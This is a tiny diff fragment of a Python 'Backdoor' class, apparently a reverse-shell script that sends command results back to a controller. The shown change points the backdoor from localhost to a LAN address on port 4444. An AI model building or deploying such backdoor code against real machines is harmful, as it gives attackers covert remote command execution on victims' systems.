@@ -65,7 +65,7 @@ class Backdoor:
             self.reliable_send(command_result)
 
 
-my_backdoor = Backdoor("localhost", 4444)
+my_backdoor = Backdoor("192.168.0.103", 4444)
 my_backdoor.run()
 
 
